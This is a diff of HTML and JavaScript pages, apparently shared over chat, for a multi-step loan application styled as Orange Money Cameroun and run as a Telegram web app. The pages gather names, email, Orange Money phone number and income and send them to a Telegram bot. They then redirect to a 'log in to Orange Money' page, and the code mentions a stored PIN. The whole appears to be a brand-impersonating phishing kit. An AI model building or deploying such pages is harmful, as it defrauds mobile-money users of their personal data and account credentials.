+            background-position: right 16px center;
+            background-size: 14px;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        textarea.form-control {
+            resize: none;
+            height: 95px;
+            font-family: inherit;
+        }
+
+        /* Button Styling */
+        .btn-next {
+            background-color: var(--orange-primary);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            margin-top: 15px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: var(--orange-hover);
+        }
+
+        .btn-next:active {
+            opacity: 0.9;
+        }
+
+        /* Bottom Footer Banner */
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #666666;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <a href="/" class="back-btn">← Retour</a>
+    <div class="header-title">
+        <span class="orange">Orange</span><span class="money">Money</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Demande de Prêt</h1>
+    <div class="subtext">Étape 1 sur 3</div>
+
+    <!-- Step Bar Progress Indicators -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <!-- Application Form -->
+    <form id="loanForm" onsubmit="submitStep1(event)">
+        <div class="form-group">
+            <label for="loanType">Type de Prêt</label>
+            <select id="loanType" class="form-control" required>
+                <option value="Prêt Personnel" selected>Prêt Personnel</option>
+                <option value="Prêt Professionnel">Prêt Professionnel</option>
+                <option value="Prêt Éducation">Prêt Éducation</option>
+                <option value="Prêt d'Urgence">Prêt d'Urgence</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="loanAmt">Montant du Prêt (FCFA)</label>
+            <input type="number" id="loanAmt" class="form-control" placeholder="250000" value="250000" required>
+        </div>
+
+        <div class="form-group">
+            <label for="loanTerm">Durée du Prêt</label>
+            <select id="loanTerm" class="form-control" required>
+                <option value="6 Mois">6 Mois</option>
+                <option value="12 Mois" selected>12 Mois</option>
+                <option value="18 Mois">18 Mois</option>
+                <option value="24 Mois">24 Mois</option>
+                <option value="36 Mois">36 Mois</option>
+                <option value="48 Mois">48 Mois</option>
+                <option value="60 Mois">60 Mois</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="loanPurpose">Objet du Prêt</label>
+            <textarea id="loanPurpose" class="form-control" placeholder="À quoi sera utilisé ce prêt ?" required></textarea>
+        </div>
+
+        <button type="submit" class="btn-next">ÉTAPE SUIVANTE</button>
+    </form>
+</div>
+
+<!-- Footer -->
+<div class="footer-banner">
+    © 2026 Orange Money Cameroun
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Retrieve stored calculations from previous step if available
+        const savedAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount') || localStorage.getItem('appliedAmount');
+        const savedDuration = localStorage.getItem('loan_term') || localStorage.getItem('loanDuration') || localStorage.getItem('duration');
+
+        if (savedAmount) {
+            const digitsOnly = savedAmount.toString().replace(/\D/g, '');
+            if (digitsOnly) {
+                document.getElementById('loanAmt').value = digitsOnly;
+            }
+        }
+
+        if (savedDuration) {
+            const formattedDuration = savedDuration.toString().trim().toLowerCase();
+            const selectEl = document.getElementById('loanTerm');
+            
+            for (let i = 0; i < selectEl.options.length; i++) {
+                if (selectEl.options[i].value.toLowerCase().includes(formattedDuration) || formattedDuration.includes(selectEl.options[i].value.toLowerCase().replace(/\D/g, ''))) {
+                    selectEl.selectedIndex = i;
+                    break;
+                }
+            }
+        }
+    };
+
+    function submitStep1(event) {
+        event.preventDefault();
+
+        const loanType = document.getElementById('loanType').value;
+        const loanAmt = Number(document.getElementById('loanAmt').value) || 0;
+        const loanTermVal = document.getElementById('loanTerm').value;
+        const loanPurpose = document.getElementById('loanPurpose').value;
+
+        // Parse duration number (e.g. "12 Mois" -> 12)
+        const months = Number(loanTermVal.replace(/\D/g, '')) || 12;
+
+        // Calculate monthly payment with 5% annual interest rate
+        const annualRate = 0.05;
+        const totalInterest = loanAmt * annualRate * (months / 12);
+        const monthlyPayment = Math.round((loanAmt + totalInterest) / months);
+
+        // Save data across all key variations to maintain storage compatibility
+        localStorage.setItem('loan_amount', loanAmt);
+        localStorage.setItem('amount', loanAmt);
+        localStorage.setItem('appliedAmount', loanAmt);
+
+        localStorage.setItem('loan_term', months);
+        localStorage.setItem('duration', months);
+        localStorage.setItem('appliedTerm', loanTermVal);
+
+        localStorage.setItem('monthly_repayment', monthlyPayment);
+        localStorage.setItem('appliedLoanType', loanType);
+        localStorage.setItem('appliedPurpose', loanPurpose);
+
+        // Transition to Page 3
+        window.location.href = "/page3"; 
+    }
+</script>
+
+</body>
+</html>
+[10/4, 1:55 AM] jk❤️‍🔥🪯: <!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money - Demande de Prêt</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #f16e00;
+            --orange-hover: #d66100;
+            --bg-color: #e5e5e5;
+            --card-bg: #ffffff;
+            --text-main: #000000;
+            --text-muted: #888888;
+            --input-border: #e2e8f0;
+            --btn-gray: #e8e8e8;
+            --btn-gray-text: #555555;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: var(--orange-primary);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn-top {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 20px;
+            font-weight: 800;
+        }
+
+        .header-title .orange { color: #d64d00; opacity: 0.85; margin-right: 4px; }
+        .header-title .money { color: #000000; }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: white;
+            border-radius: 2px;
+        }
+
+        /* Card Layout */
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Step Progress Bar */
+        .step-indicator {
+            display: flex;
+            justify-content: space-center;
+            gap: 12px;
+            margin: 0 auto 32px;
+            width: 80%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e2e8f0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: var(--orange-primary);
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 22px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 10px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #ffffff;
+            color: #333333;
+            outline: none;
+            width: 100%;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+        }
+
+        .form-control::placeholder {
+            color: #a0aec0;
+        }
+
+        .form-control:focus {
+            border-color: var(--orange-primary);
+        }
+
+        /* Phone Input Group */
+        .phone-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-prefix {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background-color: #f5f5f5;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            padding: 0 14px;
+            font-weight: 700;
+            font-size: 15px;
+            color: #111111;
+            white-space: nowrap;
+        }
+
+        .flag-icon {
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .phone-hint {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 8px;
+        }
+
+        /* Buttons Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-prev:hover {
+            background-color: #dddddd;
+        }
+
+        .btn-next {
+            background-color: var(--orange-primary);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: var(--orange-hover);
+        }
+
+        .btn-next:active, .btn-prev:active {
+            opacity: 0.9;
+        }
+
+        /* Bottom Footer Banner */
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #666666;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Retour</a>
+    <div class="header-title">
+        <span class="orange">Orange</span><span class="money">Money</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Demande de Prêt</h1>
+    <div class="subtext">Étape 2 sur 3</div>
+
+    <!-- Step Bar Progress Indicators (Steps 1 & 2 Active) -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <!-- Personal Info Form -->
+    <form id="step2Form" onsubmit="goNext(event)">
+        <div class="form-group">
+            <label for="firstName">Prénom</label>
+            <input type="text" id="firstName" class="form-control" placeholder="Jean" required>
+        </div>
+
+        <div class="form-group">
+            <label for="lastName">Nom</label>
+            <input type="text" id="lastName" class="form-control" placeholder="Mbiada" required>
+        </div>
+
+        <div class="form-group">
+            <label for="email">Adresse Email</label>
+            <input type="email" id="email" class="form-control" placeholder="jean.mbiada@exemple.cm" required>
+        </div>
+
+        <div class="form-group">
+            <label for="phone">Numéro de Téléphone Orange Money</label>
+            <div class="phone-group">
+                <div class="country-prefix">
+                    <span class="flag-icon">🇨🇲</span>
+                    <span>+237</span>
+                </div>
+                <input type="tel" id="phone" class="form-control" placeholder="691234567" maxlength="9" pattern="[6][5-9][0-9]{7}" required>
+            </div>
+            <div class="phone-hint">9 chiffres commençant par 6 (ex: 691234567)</div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">PRÉCÉDENT</button>
+            <button type="submit" class="btn-next">ÉTAPE SUIVANTE</button>
+        </div>
+    </form>
+</div>
+
+<!-- Footer -->
+<div class="footer-banner">
+    © 2026 Orange Money Cameroun
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Auto-fill existing saved user info
+        const fName = localStorage.getItem('firstName');
+        const lName = localStorage.getItem('lastName');
+        const email = localStorage.getItem('email');
+        const phone = localStorage.getItem('phone');
+
+        if (fName) document.getElementById('firstName').value = fName;
+        if (lName) document.getElementById('lastName').value = lName;
+        if (email) document.getElementById('email').value = email;
+        if (phone) document.getElementById('phone').value = phone;
+    };
+
+    function goNext(event) {
+        event.preventDefault();
+
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!fName || !lName || !email || !phone) {
+            alert("Veuillez remplir tous les champs.");
+            return;
+        }
+
+        if (!/^6[5-9]\d{7}$/.test(phone)) {
+            alert("Veuillez entrer un numéro Orange Money Cameroun valide à 9 chiffres (ex: 69XXXXXXX ou 65XXXXXXX).");
+            return;
+        }
+
+        // Save stored details
+        localStorage.setItem('firstName', fName);
+        localStorage.setItem('lastName', lName);
+        localStorage.setItem('email', email);
+        localStorage.setItem('phone', phone);
+        
+        // Save phone specifically for API verification
+        localStorage.setItem('userPhone', phone);
+
+        window.location.href = "/page4";
+    }
+
+    function goBack() {
+        window.location.href = "/page2";
+    }
+</script>
+
+</body>
+</html>
+[10/4, 1:55 AM] jk❤️‍🔥🪯: <!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money - Demande de Prêt (Résumé)</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #f16e00;
+            --orange-hover: #d66100;
+            --bg-color: #e5e5e5;
+            --card-bg: #ffffff;
+            --text-main: #000000;
+            --text-muted: #888888;
+            --input-border: #e2e8f0;
+            --btn-gray: #e8e8e8;
+            --btn-gray-text: #555555;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: var(--orange-primary);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn-top {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 20px;
+            font-weight: 800;
+        }
+
+        .header-title .orange { color: #d64d00; opacity: 0.85; margin-right: 4px; }
+        .header-title .money { color: #000000; }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: white;
+            border-radius: 2px;
+        }
+
+        /* Card Layout */
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Step Progress Bar (All 3 Steps Active) */
+        .step-indicator {
+            display: flex;
+            justify-content: space-center;
+            gap: 12px;
+            margin: 0 auto 32px;
+            width: 80%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e2e8f0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: var(--orange-primary);
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 22px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 10px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #ffffff;
+            color: #333333;
+            outline: none;
+            width: 100%;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+        }
+
+        .form-control::placeholder {
+            color: #a0aec0;
+        }
+
+        .form-control:focus {
+            border-color: var(--orange-primary);
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23555555' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 14px;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        /* Summary Box */
+        .summary-card {
+            background-color: #fafafa;
+            border-left: 4px solid var(--orange-primary);
+            padding: 18px 16px;
+            border-radius: 10px;
+            margin: 10px 0 24px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+        }
+
+        .summary-card h3 {
+            margin: 0 0 14px 0;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-main);
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #eeeeee;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .summary-label {
+            color: #666666;
+            font-size: 13.5px;
+            font-weight: 500;
+        }
+
+        .summary-value {
+            font-weight: 700;
+            font-size: 13.5px;
+            color: #111111;
+            text-align: right;
+        }
+
+        /* Button Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-prev:hover {
+            background-color: #dddddd;
+        }
+
+        .btn-next {
+            background-color: var(--orange-primary);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: var(--orange-hover);
+        }
+
+        .btn-next:active, .btn-prev:active {
+            opacity: 0.9;
+        }
+
+        /* Bottom Footer Banner */
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #666666;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Retour</a>
+    <div class="header-title">
+        <span class="orange">Orange</span><span class="money">Money</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Demande de Prêt</h1>
+    <div class="subtext">Étape 3 sur 3</div>
+
+    <!-- Step Bar Progress Indicators (All 3 Active) -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+    </div>
+
+    <!-- Form & Dynamic Summary -->
+    <form id="step3Form" onsubmit="submitForm(event)">
+        <div class="form-group">
+            <label for="jobStatus">Statut Professionnel</label>
+            <select id="jobStatus" class="form-control" required>
+                <option value="Employé" selected>Employé(e)</option>
+                <option value="Entrepreneur / Commerçant">Entrepreneur / Commerçant</option>
+                <option value="Étudiant">Étudiant(e)</option>
+                <option value="Sans emploi">Sans emploi</option>
+                <option value="Retraité">Retraité(e)</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="income">Revenu Mensuel Moyen (XAF)</label>
+            <input type="number" id="income" class="form-control" placeholder="Ex: 300000" required>
+        </div>
+
+        <div class="summary-card">
+            <h3>Résumé de la Demande</h3>
+
+            <div class="summary-row">
+                <span class="summary-label">Montant du Prêt :</span>
+                <span class="summary-value" id="sumAmount">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Durée du Prêt :</span>
+                <span class="summary-value" id="sumDuration">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Objet du Prêt :</span>
+                <span class="summary-value" id="sumPurpose">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Demandeur :</span>
+                <span class="summary-value" id="sumName">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Téléphone :</span>
+                <span class="summary-value" id="sumPhone">--</span>
+            </div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">PRÉCÉDENT</button>
+            <button type="submit" class="btn-next">SOUMETTRE LA DEMANDE</button>
+        </div>
+    </form>
+</div>
+
+<!-- Footer -->
+<div class="footer-banner">
+    © 2026 Orange Money Cameroun
+</div>
+
+<script>
+window.onload = () => {
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();   
+        tg.expand();
+    }
+
+    // Retrieve storage items from Step 1 and Step 2
+    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount');
+    const term = localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration');
+    const purpose = localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose');
+    const fName = localStorage.getItem('firstName') || "";
+    const lName = localStorage.getItem('lastName') || "";
+    const phone = localStorage.getItem('phone') || "";
+
+    // Format & Populate Summary
+    if (amount) {
+        const numAmount = Number(amount.replace(/\D/g, ''));
+        document.getElementById('sumAmount').innerText = numAmount 
+            ? `${numAmount.toLocaleString('fr-FR')} XAF` 
+            : `${amount} XAF`;
+    } else {
+        document.getElementById('sumAmount').innerText = "--";
+    }
+
+    document.getElementById('sumDuration').innerText = term ? term : "--";
+    document.getElementById('sumPurpose').innerText = purpose ? purpose : "--";
+    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
+    document.getElementById('sumPhone').innerText = phone ? `+237 ${phone}` : "--";
+};
+
+function submitForm(event) {
+    event.preventDefault();
+    const tg = window.Telegram?.WebApp;
+    const incomeVal = document.getElementById('income').value.trim();
+
+    if (!incomeVal) {
+        alert("Veuillez indiquer votre revenu mensuel moyen.");
+        return;
+    }
+
+    const data = {
+        amount: localStorage.getItem('appliedAmount') || localStorage.getItem('amount'),
+        duration: localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration'),
+        purpose: localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose'),
+        firstName: localStorage.getItem('firstName'),
+        lastName: localStorage.getItem('lastName'),
+        email: localStorage.getItem('email'),
+        phone: localStorage.getItem('phone'),
+        jobStatus: document.getElementById('jobStatus').value,
+        income: incomeVal,
+        currency: "XAF"
+    };
+
+    // Save final submission profile details
+    localStorage.setItem('jobStatus', data.jobStatus);
+    localStorage.setItem('income', incomeVal);
+
+    if (tg && tg.sendData) {
+        tg.sendData(JSON.stringify(data));
+        setTimeout(() => {
+            window.location.href = "/page5";
+        }, 300);
+    } else {
+        console.log("Submitted payload:", data);
+        window.location.href = "/page5";
+    }
+}
+
+function goBack() {
+    window.location.href = "/page3";
+}
+</script>
+
+</body>
+</html>
+[10/4, 1:55 AM] jk❤️‍🔥🪯: <!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Demande Soumise - Orange Money Cameroun</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #f15a24;
+            --bg-color: #f2f2f2;
+            --text-dark: #333333;
+            --text-muted: #666666;
+            --card-bg: #ffffff;
+            --btn-gray-bg: #f4f4f4;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* Top Floating Dark Toast Notification */
+        .toast-notification {
+            position: absolute;
+            top: 25px;
+            background-color: #212833;
+            color: #ffffff;
+            padding: 12px 20px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.18);
+            z-index: 100;
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 1.3;
+        }
+
+        .toast-icon {
+            width: 22px;
+            height: 22px;
+            background-color: var(--orange-primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 13px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        /* Main Card Container */
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 420px;
+            margin-top: 45px;
+            padding: 40px 24px 35px;
+            border-radius: 24px;
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.04);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        /* Circle Checkmark Banner */
+        .check-circle {
+            width: 88px;
+            height: 88px;
+            background-color: var(--orange-primary);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 28px;
+            color: white;
+            font-size: 38px;
+            font-weight: bold;
+            box-shadow: 0 4px 18px rgba(241, 90, 36, 0.25);
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--orange-primary);
+            margin: 0 0 20px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .message-text {
+            color: var(--text-muted);
+            font-size: 15px;
+            margin: 0 0 16px;
+            line-height: 1.55;
+            max-width: 320px;
+        }
+
+        /* Redirection Container Button & Spinner */
+        .redirect-box {
+            background-color: var(--btn-gray-bg);
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin: 20px 0 16px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            color: var(--orange-primary);
+            font-weight: 700;
+            font-size: 15px;
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid #e0e0e0;
+            border-top: 2.5px solid var(--orange-primary);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Bottom Outline Action Button */
+        .btn-outline {
+            background-color: transparent;
+            color: var(--text-dark);
+            border: 1px solid #dcdcdc;
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-outline:active {
+            background-color: #f8f8f8;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Top Floating Toast Notification -->
+<div class="toast-notification">
+    <div class="toast-icon">✓</div>
+    <div>🎉 Demande<br>soumise avec succès !</div>
+</div>
+
+<!-- Card Container -->
+<div class="card">
+    <!-- Big Orange Circle Indicator -->
+    <div class="check-circle">✓</div>
+
+    <!-- Title & Descriptions -->
+    <h1 class="main-title">Demande Soumise</h1>
+
+    <p class="message-text">
+        Votre demande de prêt a été soumise. Veuillez attendre l'approbation.
+    </p>
+
+    <p class="message-text">
+        Vous recevrez un message de confirmation. Connectez-vous à Orange Money pour continuer.
+    </p>
+
+    <!-- Redirect Countdown Box -->
+    <div class="redirect-box">
+        <div class="spinner"></div>
+        <span>Redirection dans <span id="timer">3</span>s...</span>
+    </div>
+
+    <!-- Secondary Login Button -->
+    <button type="button" class="btn-outline" onclick="goToPage6()">
+        Se connecter maintenant
+    </button>
+</div>
+
+<script>
+    let timeLeft = 3;
+    let interval;
+
+    function updateTimer() {
+        const el = document.getElementById('timer');
+        if (el) el.textContent = timeLeft;
+    }
+
+    function goToPage6() {
+        if (interval) clearInterval(interval);
+
+        // Clear temporary PIN storage before redirecting
+        localStorage.removeItem('lastPin');
+        
+        window.location.href = "/page6";
+    }
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        updateTimer();
+
+        interval = setInterval(() => {
+            timeLeft--;
+
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                goToPage6();
+                return;
+            }
+
+            updateTimer();
+        }, 1000);
+    };
+</script>
+
+</body>
+</html>
